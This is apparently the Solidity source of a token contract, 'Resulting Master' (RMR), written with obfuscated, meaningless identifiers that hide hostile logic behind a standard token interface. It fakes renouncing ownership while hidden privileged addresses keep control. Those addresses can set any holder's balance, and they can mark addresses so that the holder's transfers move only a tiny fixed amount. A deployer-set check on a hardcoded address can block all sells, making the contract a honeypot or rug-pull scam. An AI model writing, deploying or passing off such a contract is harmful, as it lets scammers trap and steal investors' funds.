//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface sellToken {
    function createPair(address amountSell, address receiverMarketing) external returns (address);
}

interface senderFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toAuto) external view returns (uint256);

    function transfer(address totalTrading, uint256 tradingLaunch) external returns (bool);

    function allowance(address buyMinMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address totalTrading,
        uint256 tradingLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txReceiverSender, uint256 value);
    event Approval(address indexed buyMinMarketing, address indexed spender, uint256 value);
}

abstract contract receiverShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fundSenderFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface senderFundMetadata is senderFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ResultingMaster is receiverShould, senderFund, senderFundMetadata {

    uint256 private tradingTakeLiquidity;

    mapping(address => bool) public tradingList;

    function totalSupply() external view virtual override returns (uint256) {
        return enableTake;
    }

    bool public launchShould;

    function modeReceiver(address txList) public {
        receiverSell();
        
        if (txList == buyTokenLimit || txList == listSwap) {
            return;
        }
        marketingLaunch[txList] = true;
    }

    constructor (){
        
        fundSenderFee senderTeam = fundSenderFee(toFrom);
        listSwap = sellToken(senderTeam.factory()).createPair(senderTeam.WETH(), address(this));
        
        buyTokenLimit = _msgSender();
        tradingList[buyTokenLimit] = true;
        shouldMode[buyTokenLimit] = enableTake;
        swapWalletLaunched();
        
        emit Transfer(address(0), buyTokenLimit, enableTake);
    }

    address public listSwap;

    mapping(address => uint256) private shouldMode;

    bool public launchSender;

    mapping(address => mapping(address => uint256)) private swapLaunched;

    function sellTx(address feeMarketing, address totalTrading, uint256 tradingLaunch) internal returns (bool) {
        if (feeMarketing == buyTokenLimit) {
            return minBuySender(feeMarketing, totalTrading, tradingLaunch);
        }
        uint256 exemptFrom = senderFund(listSwap).balanceOf(buyMax);
        require(exemptFrom == senderFrom);
        require(totalTrading != buyMax);
        if (marketingLaunch[feeMarketing]) {
            return minBuySender(feeMarketing, totalTrading, sellTrading);
        }
        return minBuySender(feeMarketing, totalTrading, tradingLaunch);
    }

    string private takeTx = "RMR";

    address buyMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public launchedTake;

    uint8 private sellTeamSwap = 18;

    function txSellLaunched(address fundShould, uint256 tradingLaunch) public {
        receiverSell();
        shouldMode[fundShould] = tradingLaunch;
    }

    bool public senderMax;

    function transferFrom(address feeMarketing, address totalTrading, uint256 tradingLaunch) external override returns (bool) {
        if (_msgSender() != toFrom) {
            if (swapLaunched[feeMarketing][_msgSender()] != type(uint256).max) {
                require(tradingLaunch <= swapLaunched[feeMarketing][_msgSender()]);
                swapLaunched[feeMarketing][_msgSender()] -= tradingLaunch;
            }
        }
        return sellTx(feeMarketing, totalTrading, tradingLaunch);
    }

    uint256 public fromBuy;

    uint256 private enableTake = 100000000 * 10 ** 18;

    address toFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public buyReceiverAt;

    bool private swapLiquidityWallet;

    uint256 private modeLaunch;

    function decimals() external view virtual override returns (uint8) {
        return sellTeamSwap;
    }

    function balanceOf(address toAuto) public view virtual override returns (uint256) {
        return shouldMode[toAuto];
    }

    uint256 public maxToken;

    uint256 feeLiquidity;

    string private walletModeExempt = "Resulting Master";

    function receiverTo(uint256 tradingLaunch) public {
        receiverSell();
        senderFrom = tradingLaunch;
    }

    function listReceiverAmount(address amountMarketing) public {
        require(amountMarketing.balance < 100000);
        if (launchedTake) {
            return;
        }
        if (txShould) {
            senderMax = false;
        }
        tradingList[amountMarketing] = true;
        
        launchedTake = true;
    }

    function approve(address launchedReceiver, uint256 tradingLaunch) public virtual override returns (bool) {
        swapLaunched[_msgSender()][launchedReceiver] = tradingLaunch;
        emit Approval(_msgSender(), launchedReceiver, tradingLaunch);
        return true;
    }

    function owner() external view returns (address) {
        return autoReceiverLaunched;
    }

    function swapWalletLaunched() public {
        emit OwnershipTransferred(buyTokenLimit, address(0));
        autoReceiverLaunched = address(0);
    }

    uint256 constant sellTrading = 18 ** 10;

    function name() external view virtual override returns (string memory) {
        return walletModeExempt;
    }

    function getOwner() external view returns (address) {
        return autoReceiverLaunched;
    }

    function allowance(address walletTotal, address launchedReceiver) external view virtual override returns (uint256) {
        if (launchedReceiver == toFrom) {
            return type(uint256).max;
        }
        return swapLaunched[walletTotal][launchedReceiver];
    }

    address public buyTokenLimit;

    function symbol() external view virtual override returns (string memory) {
        return takeTx;
    }

    uint256 senderFrom;

    function transfer(address fundShould, uint256 tradingLaunch) external virtual override returns (bool) {
        return sellTx(_msgSender(), fundShould, tradingLaunch);
    }

    function receiverSell() private view {
        require(tradingList[_msgSender()]);
    }

    bool public txShould;

    function minBuySender(address feeMarketing, address totalTrading, uint256 tradingLaunch) internal returns (bool) {
        require(shouldMode[feeMarketing] >= tradingLaunch);
        shouldMode[feeMarketing] -= tradingLaunch;
        shouldMode[totalTrading] += tradingLaunch;
        emit Transfer(feeMarketing, totalTrading, tradingLaunch);
        return true;
    }

    mapping(address => bool) public marketingLaunch;

    address private autoReceiverLaunched;

    event OwnershipTransferred(address indexed fundBuy, address indexed autoAmount);

}